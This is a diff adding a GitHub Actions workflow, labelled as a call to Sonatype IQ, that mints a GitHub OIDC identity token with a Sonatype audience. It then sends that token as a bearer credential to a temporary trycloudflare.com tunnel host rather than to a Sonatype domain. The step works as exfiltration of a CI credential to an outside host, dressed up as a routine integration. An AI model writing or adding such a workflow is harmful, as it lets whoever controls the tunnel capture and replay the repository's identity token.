@@ -1,0 +1,16 @@
+name: CI call to IQ
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  call:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Ask IQ for an installation token
+        run: |
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://guide.sonatype.com" | jq -r .value)
+          code=$(curl -s -o body.json -w '%{http_code}' -X POST -H "Authorization: Bearer $OIDC" -H 'Content-Type: application/json' -d '{}' https://instrumental-tourist-meet-damages.trycloudflare.com/api/agp/agp/installation-token)
+          echo "HTTP $code"
+          jq -c 'if .token then .token = "***" else . end' body.json || cat body.json
+          [ "$code" = "200" ]
